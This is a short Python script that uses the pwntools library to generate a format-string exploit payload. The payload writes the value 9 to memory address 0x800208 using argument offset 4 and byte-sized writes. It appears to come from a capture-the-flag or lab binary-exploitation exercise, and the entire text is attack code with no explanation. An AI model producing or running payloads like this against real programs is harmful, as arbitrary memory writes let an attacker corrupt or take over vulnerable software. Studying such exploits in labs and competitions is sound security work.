from pwn import *

print(fmtstr_payload(4, {0x800208: 9}, write_size='byte'))
